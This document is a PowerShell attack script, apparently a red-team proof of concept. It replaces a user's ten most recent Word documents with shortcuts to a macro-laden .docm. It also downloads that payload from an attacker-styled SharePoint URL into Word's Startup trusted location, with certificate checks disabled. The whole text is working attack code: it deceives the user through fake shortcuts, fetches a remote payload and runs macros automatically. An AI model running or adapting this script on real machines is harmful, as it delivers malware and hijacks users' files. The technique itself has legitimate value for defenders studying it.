#Find Top 10
$TopFiles = Get-ChildItem -Recurse C:\Users\Craig\Documents\TEST -filter "*.docx" | sort LastWriteTime -Descending | select FullName | select -First 10

#Create arrays of existing files and future LNK's
$Files = $TopFiles.FullName
$LNK = $TopFiles.FullName -replace "docx","lnk"

#Create Shortcuts to malicious Totally-Legitimate-Document.docm within Word 2016's Trusted Location
foreach ($file in $LNK) 
	{
		$Shell = New-Object -ComObject ("WScript.Shell")
		$ShortCut = $Shell.CreateShortcut($file)
		$ShortCut.TargetPath=$env:USERPROFILE + "\AppData\Roaming\Microsoft\Word\Startup\Totally-Legitimate-Document.docm"
		$ShortCut.Save()
		sleep 1
	}
	
#Sharepoint URL - Substitute guestaccess.aspx with download.aspx
$Url = "https://eviler-my.sharepoint.com/personal/badguy_eviler_onmicrosoft_com/_layouts/15/download.aspx?docid=13e2671c5e3cf41a99c3b4ddca9d3e313&authkey=Ab7LB1TuDzCM7pf8EUqDWok"
$Path = $env:USERPROFILE + "\AppData\Roaming\Microsoft\Word\Startup\Totally-Legitimate-Document.docm"
[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
$webClient = new-object System.Net.WebClient
$webClient.DownloadFile( $Url, $Path )

#Delete Files

Exit
